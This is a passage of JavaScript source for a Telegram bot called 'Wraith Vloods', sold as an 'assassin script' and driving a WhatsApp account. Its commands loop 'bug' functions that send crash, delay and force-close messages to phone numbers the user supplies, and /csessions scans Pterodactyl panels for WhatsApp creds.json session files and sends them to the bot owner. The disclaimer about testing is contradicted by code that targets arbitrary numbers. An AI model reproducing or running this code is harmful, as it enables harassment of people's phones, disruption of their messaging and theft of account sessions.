        return ctx.reply(`[ $ ] Parse error:\n${e.message}`);
    }

    const context = {
        sendMessage: async (chatId, text, opts = {}) => {
            return bot.telegram.sendMessage(chatId, text, opts);
        }
    };

    await ctx.reply(
        `[ # ] *TESFUNC EXECUTION*\n\n$ Target : ${number}\n$ Loop   : ${loop}x`,
        { parse_mode: 'Markdown' }
    );

    for (let i = 0; i < loop; i++) {
        try {
            await fn(bot, target, context);
        } catch (e) {
            console.log('[TESFUNC ERROR]', e);
        }
    }

    ctx.reply('[ ! ] Done');
});

// ===== /cekfunc =====
bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "❌ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `
🟢 <b>SYNTAX CHECK: PASSED</b>

✅ <b>Status:</b> Aman, tidak ditemukan error syntax
🧠 <b>Parser:</b> Node.js V8 Engine
📦 <b>Mode:</b> Async Function Wrapper
🔐 <b>Execution:</b> Diblokir (Syntax-only)

📊 <b>Analisis Singkat:</b>
• Struktur kode valid
• Kurung & scope seimbang
• Keyword JavaScript dikenali
• Siap dieksekusi tanpa crash syntax

🚀 <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer 😎🔥
    `;

    return ctx.reply(successMsg, { parse_mode: "HTML" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `
🔴 <b>SYNTAX ERROR DETECTED</b>

❌ <b>Status:</b> Gagal parse kode
🧠 <b>Engine:</b> Node.js V8
📍 <b>Error Type:</b> ${err.name}

🧾 <b>Detail Pesan:</b>
<pre>${err.message}</pre>

🛠️ <b>Kemungkinan Penyebab:</b>
• Kurung <code>() {} []</code> tidak seimbang
• Salah penempatan <code>async / await</code>
• Typo keyword JavaScript
• Karakter ilegal / tidak tertutup

📌 <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

💀 <i>Fix it, then we talk again.</i>
    `;

    return ctx.reply(errorMsg, { parse_mode: "HTML" });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  const replyId = ctx.message.message_id;

  if (!input) {
    return ctx.reply(
      "⚠️ *Masukan URL website*\n\nContoh:\n`/trackweb https://example.com`",
      { reply_to_message_id: replyId, parse_mode: "Markdown" }
    );
  }

  let url;
  try {
    url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
  } catch {
    return ctx.reply("❌ URL tidak valid.", { reply_to_message_id: replyId });
  }

  const domain = url.hostname;

  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, {
      timeout: 10000,
      validateStatus: () => true
    });

    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";

    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";

    const output = `
🔍 *WEB TRACK RESULT*

🌐 *Domain*
${domain}

📡 *Network*
IP       : ${dnsResult.address}
Family   : IPv${dnsResult.family}

🖥 *Server*
WebSrv   : ${server}
Powered  : ${powered}
CloudFlr : ${cloudflare}

🔐 *Security*
HTTPS    : ${ssl}
Status   : ${res.status}

🧩 *Headers*
CSP      : ${headers["content-security-policy"] ? "Yes" : "No"}
HSTS     : ${headers["strict-transport-security"] ? "Yes" : "No"}
X-Frame  : ${headers["x-frame-options"] ? "Yes" : "No"}

⚠️ *Note*
• Data publik
• Aman & legal
`;

    ctx.reply(output, {
      reply_to_message_id: replyId,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal analisis website.", { reply_to_message_id: replyId });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("❌ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("🔍 Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
📡 Status: ${statusText}
📄 HTTP Code: ${res.status}
⏱ Response Time: ${ping} ms

✅ Website masih bisa diakses Jier😭🗿😌`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
🔴 Status: DOWN WKWKWK
⏱ Timeout / No Response

❌ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("multibug", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
      return ctx.reply(
        "❌ *Format salah*\n\n" +
        "📌 Contoh:\n" +
        "`/multibug 62xxx, 62xxxx, 62xxxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 *MULTI BUG STARTED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 20;
      for (let i = 0; i < loopBug; i++) {
        await sleep(1000);
        await namaFuncLuOne(sock, target);
        await namaFuncLuTwo(sock, target);
        await namaFuncLuThree(sock, target);
        await sleep(1000);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ *MULTI BUG COMPLETED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT SI ANJING ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === PAKE USERBAME SI TOLOL @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Salah Tolol!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ dongo gabisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User Si hama ===
  if (!target.username) {
    return ctx.reply(
`❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
`✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});
// =================== /carisesi ===================
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
//============( MENU UTAMA ) =======\\

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
        }
        return ctx.reply("🔒 Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
      const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
      const parts = raw.trim().split(" ");
      const userToken = parts.length > 1 ? parts[1].trim() : "";

      if (!userToken) {
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>");
      }

      try {
        const res = await axios.get(databaseUrl);
        const tokens = (res.data && res.data.tokens) || [];

        if (!tokens.includes(userToken) || userToken !== tokenBot) {
          return ctx.reply("❌ Token tidak terdaftar, masukkan yang valid");
        }

        tokenValidated = true;
        return ctx.reply("✅ Token berhasil diaktifkan, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("❌ Gagal memverifikasi token");
      }
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    
    const menuMessage = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

 こんにちは、@${ctx.from.username}。自己紹介させてください。私は Wraith Vloods という 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットです。TESTING AUTO UPDATE 

🕊 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
───────────
〢☐ Developer: ShaenOfficial
〢☐ Username: ${ctx.from.first_name}
〢☐ Language: JavaScript
〢☐ Version: 10.0

🖥 - 𝐒𝐢𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
────────────────
〢☐ Sender: ${senderStatus}
〢☐ Runtime: ${runtimeStatus}
〢☐ StatusPremium: ${premiumStatus}
〢☐ Memory: ${memoryStatus}
〢☐ Cooldown: ${cooldownStatus} Second

Page 1/2</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {    text: "Owner",
                 url: "https://t.me/ShaenOfficial"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
            {
               text: "Information", url: "https://t.me/Testimonideryan"
           }
        ],
    ];

    ctx.replyWithVideo(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  
    const menuMessage = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

 こんにちは、@${ctx.from.username}。自己紹介させてください。私は Wraith Vloods という 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットです。

🕊 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
───────────
〢☐ Developer: ShaenOfficial
〢☐ Username: ${ctx.from.first_name}
〢☐ Language: JavaScript
〢☐ Version: 10.0

🖥 - 𝐒𝐢𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
────────────────
〢☐ Sender: ${senderStatus}
〢☐ Runtime: ${runtimeStatus}
〢☐ StatusPremium: ${premiumStatus}
〢☐ Memory: ${memoryStatus}
〢☐ Cooldown: ${cooldownStatus} Second

Page 1/2</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {
                text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
             {
               text: "Information", 
               url: "https://t.me/Testimonideryan"
           }
         ],
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'video',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const controlsMenu = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

🕹 - 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐬 𝐌𝐞𝐧𝐮
─────────────
〢☐ /addsender - Add Sender Number
〢☐ /resetsession - Reset Existing Session
〢☐ /setcooldown - Set Bot Cooldown
〢☐ /addprem - Add Premium Users
〢☐ /delprem - Delete Premium Users
〢☐ /addgroup - Add Premium Group
〢☐ /delgroup - Delete Premium Group

Page 2/3</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/start"
            }, 
            {   text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {   text: ">",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

🧬 - 𝐃𝐞𝐥𝐚𝐲 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
──────────────
〢☐ /zayin [ Invisible Delay For Murbug ]
〢☐ /vav [ Delay Hard ]

🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
────────────────
〢☐ /yudbet [ Forclose 1 Message ]
〢☐ /gimmel [ Forcloce For Murbug ]

🧬 - 𝐂𝐫𝐚𝐬𝐡 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
──────────────
〢☐ /aleph [ Blank Andro No Work All Device ]
〢☐ /dallet [ Crash Ip ]

🧬 - 𝐌𝐮𝐥𝐭𝐢 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
──────────────
〢☐ /multibug [ Bug Lebih Dari 1 Nomor ]

Example: /zayin 62xxxx 

Page 3/4</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/controls"
            }, 
            {   text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {   text: ">",
                callback_data: "/fun"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/about', async (ctx) => {
    const aboutMenu = `
<blockquote>
 Name       : Wraith Vloods
 Developer   : @ShaenOfficial
 Version      : 10.0
 Language    : JavaScript (Node.js)
 Build Date   : October 2025 

 Description :
このスクリプトは、WhatsAppとWhatsAppのセキュリティ向上を目的として作成されました。 このスクリプトの機能は、「バグメッセージ」ペイロードシステム、安定したスパム、JSON/Protobuf構造検証エクスプロイトを使用して、WhatsApp（WA Bot）のメッセージ構造のセキュリティをテストすることです。 免責事項： 作成者は、このスクリプトの誤用について一切責任を負いません。 テスト環境でのみ使用し、システムに損害を与えたり、他のユーザーに干渉したりしないでください。
 © 2025 ShaenOfficial | All Rights Reserved
 
 Page 6/1</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/tqto"
            }, 
            {   text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {   text: ">",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(aboutMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

⚔️ - 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨
───────────
〢☐ @ShaenOfficial [ Creator ]
〢☐ @Xatanicvxii [ My support ]
〢☐ @Xwarrxxx [ My support ]
〢☐ @BarzzNotDev [ Best Friends ]
〢☐ @Ozzy [ Best Friends ]
〢☐ @Lixy [ Best Friends ]
〢☐ @Diszz [ Best Friends ]

 Thank you for purchasing the assassin script
 
 Page 5/6</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/fun"
            }, 
            {   text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {   text: ">",
                callback_data: "/about"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/fun', async (ctx) => {
    const funMenu = `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

🎭 - 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮
──────────
〢☐ /iqc - Ss Chat Iphone
〢☐ /csessions - Scan Sender With Adp
〢☐ /tourl - Photos And Videos To Link
〢☐ /testfunc - Function Test
〢☐ /cekfunc - Check Error Function
〢☐ /trackweb - Tracking Website
〢☐ /statuswebsite - Check Status Website
〢☐ /cekid - Check Id Website
〢☐ /cekbio - Check Bio WhatsApp

Page 4/5</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/bug"
            },
            {   text: "Owner",
                url: "https://t.me/ShaenOfficial"
            }, 
            {   text: ">",
                callback_data: "/tqto"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(funMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//============( CASE BUG ) =======\\
bot.command("zayin", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zayin 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Bebas Spam
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 40; i++) {
   await Vxquotes(sock, target);
   await slowDelay();
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Bebas Spam
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("vav", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /vav 62×××`);
